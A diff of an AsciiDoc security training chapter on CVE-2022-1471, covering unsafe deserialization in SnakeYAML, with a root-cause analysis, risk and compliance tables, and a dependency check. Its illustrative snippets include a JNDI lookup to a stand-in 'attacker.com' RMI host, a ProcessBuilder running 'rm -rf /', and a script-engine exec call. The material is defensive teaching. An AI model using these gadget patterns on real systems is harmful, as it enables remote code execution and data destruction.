@@ -1,5 +1,278 @@
-== The exploit is not always in "your" code
-Below is an example of using the same WebGoat source code, but different versions of the jquery-ui component. One is exploitable; one is not.
+[[part2-vulnerability]]
+= Part 2: The Vulnerability - CVE-2022-1471
 
-=== jquery-ui:1.10.4
-This example allows the user to specify the content of the "closeText" for the jquery-ui dialog. This is an unlikely development scenario, however the jquery-ui dialog (TBD - show exploit link) does not defend against XSS in the button text of the close dialog.
+== [[vulnerability-details]]CVE-2022-1471 Details
+
+[cols="2,3", options="header"]
+|===
+| Attribute | Value
+| CVE ID | https://nvd.nist.gov/vuln/detail/CVE-2022-1471[CVE-2022-1471]
+| CVSS Score | **9.8 (Critical)**
+| Severity | 🔴 **CRITICAL**
+| Vulnerability Type | Unsafe Deserialization
+| CWE | https://cwe.mitre.org/data/definitions/502.html[CWE-502]
+| Affected Product | SnakeYAML library
+| Affected Versions | All versions < 2.0
+| Publication Date | December 28, 2022
+| Exploitability | Easy - No authentication required
+|===
+
+---
+
+== [[root-cause]]Root Cause Analysis
+
+=== The Problem: Unrestricted Class Instantiation
+
+SnakeYAML's default `Constructor` class allows **any Java class on the classpath** to be instantiated during YAML deserialization.
+
+==== Vulnerable Code Pattern
+
+[source,java]
+----
+// VULNERABLE: No restrictions on what classes can be instantiated
+Yaml yaml = new Yaml(new Constructor());
+Object obj = yaml.load(userInput);
+----
+
+When this code encounters YAML like:
+[source,yaml]
+----
+!!javax.script.ScriptEngineManager [...]
+----
+
+It does this:
+[source,java]
+----
+// Pseudocode of what happens internally
+String className = "javax.script.ScriptEngineManager";
+Class<?> clazz = Class.forName(className);  // Load class from classpath
+Constructor<?> constructor = clazz.getConstructor(/* args */);
+Object instance = constructor.newInstance(/* args */);  // ← RCE HAPPENS HERE
+----
+
+=== Why is This Dangerous?
+
+Certain Java classes execute code when they're instantiated or when their properties are set.
+
+==== Class: javax.script.ScriptEngineManager
+
+[source,java]
+----
+// When ScriptEngineManager is instantiated, 
+// it can be configured to load scripts
+
+ScriptEngineManager manager = new ScriptEngineManager(classLoader);
+ScriptEngine engine = manager.getEngineByName("JavaScript");
+engine.eval("java.lang.Runtime.getRuntime().exec('whoami')");
+----
+
+**Attack surface:** Attacker provides a URLClassLoader that loads malicious code.
+
+==== Class: java.lang.ProcessBuilder
+
+[source,java]
+----
+// ProcessBuilder executes system commands when instantiated
+ProcessBuilder pb = new ProcessBuilder("bash", "-c", "rm -rf /");
+pb.start();  // Command executes immediately
+----
+
+**Attack surface:** Direct system command execution.
+
+==== Class: com.sun.rowset.JdbcRowSetImpl
+
+[source,java]
+----
+// JdbcRowSetImpl performs JNDI lookups which can be exploited
+JdbcRowSetImpl rs = new JdbcRowSetImpl();
+rs.setDataSourceName("rmi://attacker.com:1099/Exploit");
+rs.setAutoCommit(true);  // Triggers JNDI lookup
+// Attacker returns malicious serialized object → Gadget chain RCE
+----
+
+**Attack surface:** JNDI Injection leading to RCE.
+
+=== The Gadget Chain Concept
+
+[cols="1,2,3"]
+|===
+| Step | Action | Details
+
+| 1
+| Attacker sends YAML
+| Contains `!!javax.script.ScriptEngineManager`
+
+| 2
+| SnakeYAML deserializes
+| Creates instance of ScriptEngineManager
+
+| 3
+| Constructor executes
+| Code runs during object creation/property setting
+
+| 4
+| Code downloads payload
+| URLClassLoader loads malicious JAR
+
+| 5
+| Malicious JAR executes
+| Attacker code runs with application privileges
+
+| 6
+| RCE Complete
+| Server compromised
+|===
+
+---
+
+== [[consequences]]Consequences of Not Updating
+
+What happens if you ignore this vulnerability?
+
+=== Immediate Risks
+
+[cols="2,3,2"]
+|===
+| Risk | Impact | Severity
+
+| Remote Code Execution
+| Attacker executes arbitrary commands on server
+| 🔴 Critical
+
+| Data Breach
+| All sensitive data stolen
+| 🔴 Critical
+
+| Lateral Movement
+| Attacker pivots to internal network
+| 🔴 Critical
+
+| Cryptomining
+| Server CPU hijacked for crypto mining
+| 🟠 High
+
+| Ransomware
+| Data encrypted, ransom demanded
+| 🔴 Critical
+
+| Service Disruption
+| Application completely unavailable
+| 🟠 High
+|===
+
+=== Real-World Attack Scenario
+
+[source]
+----
+Day 1: Attacker discovers your app uses SnakeYAML 1.30
+         ↓
+Day 2: Attacker crafts YAML payload
+         ↓
+Day 3: Attacker sends payload to your API
+         ↓
+Day 4: Server is compromised
+         ↓
+Day 5-30: Attacker steals data, sets up persistence
+         ↓
+Day 31: You discover the breach (if lucky)
+         ↓
+Day 32+: Incident response, legal liability, reputation damage
+----
+
+=== Financial Impact
+
+According to IBM 2023 Data Breach Report:
+
+* **Average breach cost:** $4.45 million
+* **Healthcare sector:** $10.93 million average
+* **Largest single breach:** $180 million settlement
+* **Time to detect:** Average 206 days (detected by third party)
+
+*Your delay in patching = Direct financial liability*
+
+=== Compliance Impact
+
+[cols="2,3"]
+|===
+| Regulation | Requirement
+
+| GDPR
+| Report breach within 72 hours or face €20M fine
+
+| HIPAA
+| Report breach to affected individuals, face fines
+
+| PCI-DSS
+| Maintain security patches, failure = card processing revocation
+
+| SOC 2
+| Demonstrate timely security updates in audits
+
+| ISO 27001
+| Maintain vulnerability management program
+|===
+
+Failing to patch = **Regulatory non-compliance** = **Legal liability**
+
+=== Reputational Damage
+
+Real examples from public CVE disclosures:
+
+* **Company A:** App was compromised → Customer data leaked → Lost contracts
+* **Company B:** Security patch ignored → Ransomware → Paid $500K ransom
+* **Company C:** Breach via known CVE → SEC investigation → Stock price dropped 20%
+
+---
+
+== The Patch Window
+
+[cols="1,4"]
+|===
+| Timeline | Status
+
+| **0 days**
+| CVE published, exploit available
+
+| **1-7 days**
+| Automated scanning detects your vulnerability
+
+| **7-30 days**
+| Attackers begin automated scanning for targets
+
+| **30-90 days**
+| Active exploitation in the wild
+
+| **90+ days**
+| Multiple botnet infections, ransomware variants
+|===
+
+**"We'll patch it next quarter" is not a viable strategy for Critical CVEs.**
+
+---
+
+== Quick Assessment: Are You Vulnerable?
+
+[NOTE]
+.Check Your Dependencies
+====
+Run this command to find SnakeYAML versions:
+
+[source,bash]
+----
+mvn dependency:tree | grep snakeyaml
+----
+
+If you see:
+* `snakeyaml:1.30` ✗ VULNERABLE
+* `snakeyaml:1.29` ✗ VULNERABLE
+* `snakeyaml:2.0+` ✓ SAFE
+* Not found ✓ SAFE
+====
+
+---
+
+== Next Steps
+
+✓ You understand the vulnerability and its consequences  
+→ Proceed to **Part 3: Exploitation** to see how attacks work  
+→ Or skip to **Part 4: Mitigation** for the fix
